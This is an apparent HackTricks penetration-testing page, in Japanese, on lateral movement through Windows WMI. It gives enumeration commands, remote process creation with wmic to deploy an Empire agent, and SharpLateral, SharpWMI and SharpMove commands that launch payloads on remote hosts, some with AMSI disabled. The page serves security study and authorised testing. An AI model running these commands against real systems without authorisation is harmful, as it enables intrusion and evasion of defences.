# WmiExec

{{#include ../../banners/hacktricks-training.md}}

## 仕組みの説明

ユーザー名とパスワードまたはハッシュのいずれかが判明している場合、WMIを使用してホスト上のプロセスを開くことができます。WmiexecはWMIを使用してコマンドを実行し、セミインタラクティブなシェル環境を提供します。

**dcomexec.py:** 異なるDCOMエンドポイントを使用し、このスクリプトは`wmiexec.py`に類似したセミインタラクティブなシェルを提供します。選択した`-object`の値によってエンドポイントが決まり、サポートされているオブジェクトには`MMC20.Application`、`ShellWindows`、`ShellBrowserWindow`があります。後者は、元のwalkthroughで取り上げられているShell Browser Window techniqueを提供します。<sup>[[2]](#references)[[3]](#references)</sup>

## WMIの基礎

### Namespace

ディレクトリ形式の階層として構成されるWMIの最上位コンテナーは\rootで、その下にnamespaceと呼ばれる追加のディレクトリが整理されています。<sup>[[1]](#references)</sup>
Namespaceを一覧表示するコマンド：
```bash
# Retrieval of Root namespaces
gwmi -namespace "root" -Class "__Namespace" | Select Name

# Enumeration of all namespaces (administrator privileges may be required)
Get-WmiObject -Class "__Namespace" -Namespace "Root" -List -Recurse 2> $null | select __Namespace | sort __Namespace

# Listing of namespaces within "root\cimv2"
Get-WmiObject -Class "__Namespace" -Namespace "root\cimv2" -List -Recurse 2> $null | select __Namespace | sort __Namespace
```
namespace 内のクラスは、次のように一覧表示できます。
```bash
gwmwi -List -Recurse # Defaults to "root\cimv2" if no namespace specified
gwmi -Namespace "root/microsoft" -List -Recurse
```
### **クラス**

win32_process などの WMI class 名と、それが存在する namespace を知ることは、あらゆる WMI 操作に不可欠です。  
`win32` で始まる class を一覧表示するコマンド:
```bash
Get-WmiObject -Recurse -List -class win32* | more # Defaults to "root\cimv2"
gwmi -Namespace "root/microsoft" -List -Recurse -Class "MSFT_MpComput*"
```
クラスの呼び出し:
```bash
# Defaults to "root/cimv2" when namespace isn't specified
Get-WmiObject -Class win32_share
Get-WmiObject -Namespace "root/microsoft/windows/defender" -Class MSFT_MpComputerStatus
```
### Methods

WMI classesの1つ以上の実行可能なfunctionであるMethodsは、実行可能です。
```bash
# Class loading, method listing, and execution
$c = [wmiclass]"win32_share"
$c.methods
# To create a share: $c.Create("c:\share\path","name",0,$null,"My Description")
```

```bash
# Method listing and invocation
Invoke-WmiMethod -Class win32_share -Name Create -ArgumentList @($null, "Description", $null, "Name", $null, "c:\share\path",0)
```
## WMI Enumeration

### WMI Service Status

WMI serviceが稼働しているか確認するコマンド:
```bash
# WMI service status check
Get-Service Winmgmt

# Via CMD
net start | findstr "Instrumentation"
```
### システムおよびプロセス情報

WMIを介してシステムおよびプロセス情報を収集する：
```bash
Get-WmiObject -ClassName win32_operatingsystem | select * | more
Get-WmiObject win32_process | Select Name, Processid
```
攻撃者にとって、WMIはシステムやドメインに関する機密データを列挙するための強力なツールです。<sup>[[1]](#references)</sup>
```bash
wmic computerystem list full /format:list
wmic process list /format:list
wmic ntdomain list /format:list
wmic useraccount list /format:list
wmic group list /format:list
wmic sysaccount list /format:list
```
特定の情報（local admins や logged-on users など）を対象とした WMI の remote querying は、コマンドを慎重に構築することで実行できます。

### **Manual Remote WMI Querying**

remote machine 上の local admins と logged-on users を stealthy に特定するには、特定の WMI queries を使用します。`wmic` は text file から読み込んで、複数の nodes 上で同時に commands を実行することもサポートしています。<sup>[[1]](#references)</sup>

WMI 経由で process を remotely execute するには、たとえば Empire agent を deploy する場合、以下の command structure を使用します。実行が成功すると、return value は "0" になります。<sup>[[1]](#references)</sup>
```bash
wmic /node:hostname /user:user path win32_process call create "empire launcher string here"
```
このプロセスは、WMIのリモート実行およびシステム列挙機能を示しており、システム管理とpentestingの両方における有用性を強調しています。

## Automatic Tools

- [**SharpLateral**](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral redwmi HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe
```
- [**SharpWMI**](https://github.com/GhostPack/SharpWMI)
```bash
SharpWMI.exe action=exec [computername=HOST[,HOST2,...]] command=""C:\\temp\\process.exe [args]"" [amsi=disable] [result=true]
# Stealthier execution with VBS
SharpWMI.exe action=executevbs [computername=HOST[,HOST2,...]] [script-specification] [eventname=blah] [amsi=disable] [time-specs]
```
- [**https://github.com/0xthirteen/SharpMove**](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=query computername=remote.host.local query="select * from win32_process" username=domain\user password=password
SharpMove.exe action=create computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true username=domain\user password=password
SharpMove.exe action=executevbs computername=remote.host.local eventname=Debug amsi=true username=domain\\user password=password
```
- **Impacket の `wmiexec`**を使用することもできます。


## References

- [1] [Credentials を使用して Windows マシンを掌握する - Part 3（WMI と WinRM）](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/)
- [2] [Fortra Impacket - dcomexec.py](https://github.com/fortra/impacket/blob/master/examples/dcomexec.py)
- [3] [Impacket Tool Kit 初心者向けガイド、Part 1 - Hacking Articles（Internet Archive）](https://web.archive.org/web/20190822180831/https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/)
{{#include ../../banners/hacktricks-training.md}}
